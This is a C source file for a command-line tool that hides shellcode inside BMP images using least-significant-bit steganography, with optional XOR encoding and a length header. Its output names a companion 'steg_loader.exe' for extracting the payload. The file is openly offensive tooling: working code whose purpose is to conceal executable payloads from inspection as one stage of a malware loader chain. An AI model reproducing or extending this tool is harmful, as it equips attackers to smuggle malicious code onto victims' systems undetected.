// ============================================================
//  STEG ENCODE — Hide shellcode inside a BMP image
// ============================================================
//  Embeds data into the least significant bits of pixel bytes.
//  The image looks identical to the human eye.
//
//  Usage: steg_encode <input.bmp> <shellcode.bin> <output.bmp> [xor_key] [bits 1-4]
// ============================================================

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma pack(push, 1)
typedef struct {
    unsigned short bfType;
    unsigned int   bfSize;
    unsigned short bfReserved1;
    unsigned short bfReserved2;
    unsigned int   bfOffBits;
} BMP_FILE_HDR;

typedef struct {
    unsigned int   biSize;
    int            biWidth;
    int            biHeight;
    unsigned short biPlanes;
    unsigned short biBitCount;
    unsigned int   biCompression;
    unsigned int   biSizeImage;
    int            biXPelsPerMeter;
    int            biYPelsPerMeter;
    unsigned int   biClrUsed;
    unsigned int   biClrImportant;
} BMP_INFO_HDR;
#pragma pack(pop)

static int get_bit(unsigned char *data, int pos) {
    return (data[pos / 8] >> (7 - (pos % 8))) & 1;
}

int main(int argc, char *argv[]) {
    if (argc < 4) {
        printf("Steg Encode — Hide shellcode in BMP\n\n");
        printf("Usage: %s <input.bmp> <payload.bin> <output.bmp> [xor_key 0-255] [bits 1-4]\n", argv[0]);
        printf("\n  bits = LSBs per channel (default 2, higher = more capacity, less invisible)\n");
        return 1;
    }

    const char *bmp_in   = argv[1];
    const char *bin_in   = argv[2];
    const char *bmp_out  = argv[3];
    unsigned char xor_key = (argc >= 5) ? (unsigned char)atoi(argv[4]) : 0;
    int bpc = (argc >= 6) ? atoi(argv[5]) : 2;
    if (bpc < 1) bpc = 1;
    if (bpc > 4) bpc = 4;

    // Read BMP
    FILE *f = fopen(bmp_in, "rb");
    if (!f) { printf("[-] Cannot open: %s\n", bmp_in); return 1; }
    fseek(f, 0, SEEK_END);
    long bmp_size = ftell(f);
    fseek(f, 0, SEEK_SET);
    unsigned char *bmp = (unsigned char *)malloc(bmp_size);
    fread(bmp, 1, bmp_size, f);
    fclose(f);

    BMP_FILE_HDR *fhdr = (BMP_FILE_HDR *)bmp;
    BMP_INFO_HDR *ihdr = (BMP_INFO_HDR *)(bmp + sizeof(BMP_FILE_HDR));

    if (fhdr->bfType != 0x4D42) {
        printf("[-] Not a BMP file\n"); free(bmp); return 1;
    }
    if (ihdr->biBitCount != 24 || ihdr->biCompression != 0) {
        printf("[-] Only 24-bit uncompressed BMP supported\n"); free(bmp); return 1;
    }

    unsigned char *pixels = bmp + fhdr->bfOffBits;
    long pixel_bytes = bmp_size - fhdr->bfOffBits;

    // Read shellcode
    f = fopen(bin_in, "rb");
    if (!f) { printf("[-] Cannot open: %s\n", bin_in); free(bmp); return 1; }
    fseek(f, 0, SEEK_END);
    long sc_len = ftell(f);
    fseek(f, 0, SEEK_SET);
    unsigned char *sc = (unsigned char *)malloc(sc_len);
    fread(sc, 1, sc_len, f);
    fclose(f);

    // XOR encode if key given
    if (xor_key != 0) {
        for (long i = 0; i < sc_len; i++) sc[i] ^= xor_key;
    }

    // Build embed data: [4-byte length][shellcode]
    long data_len = 4 + sc_len;
    unsigned char *data = (unsigned char *)calloc(data_len, 1);
    data[0] = (sc_len >> 24) & 0xFF;
    data[1] = (sc_len >> 16) & 0xFF;
    data[2] = (sc_len >>  8) & 0xFF;
    data[3] = (sc_len      ) & 0xFF;
    memcpy(data + 4, sc, sc_len);

    // Check capacity
    long total_bits = data_len * 8;
    long capacity_bits = pixel_bytes * bpc;
    if (total_bits > capacity_bits) {
        printf("[-] Image too small. Need %ld bits, have %ld bits\n", total_bits, capacity_bits);
        printf("    Try a larger image or increase bits per channel\n");
        free(bmp); free(sc); free(data);
        return 1;
    }

    // Embed into LSBs
    unsigned char mask = (1 << bpc) - 1;
    int data_bit = 0;

    for (long i = 0; i < pixel_bytes && data_bit < total_bits; i++) {
        pixels[i] &= ~mask;
        for (int b = bpc - 1; b >= 0; b--) {
            if (data_bit < total_bits) {
                pixels[i] |= (get_bit(data, data_bit) << b);
                data_bit++;
            }
        }
    }

    // Write output BMP
    f = fopen(bmp_out, "wb");
    if (!f) { printf("[-] Cannot write: %s\n", bmp_out); free(bmp); free(sc); free(data); return 1; }
    fwrite(bmp, 1, bmp_size, f);
    fclose(f);

    float usage = (float)total_bits / capacity_bits * 100.0f;
    printf("[+] Embedded %ld bytes into %s\n", sc_len, bmp_out);
    printf("[+] %d bits/channel | Capacity used: %.1f%%\n", bpc, usage);
    if (xor_key) printf("[+] XOR key: 0x%02X\n", xor_key);
    printf("[+] Decode: steg_loader.exe %s", bmp_out);
    if (xor_key) printf(" -x %d", xor_key);
    if (bpc != 2) printf(" -b %d", bpc);
    printf("\n");

    free(bmp); free(sc); free(data);
    return 0;
}
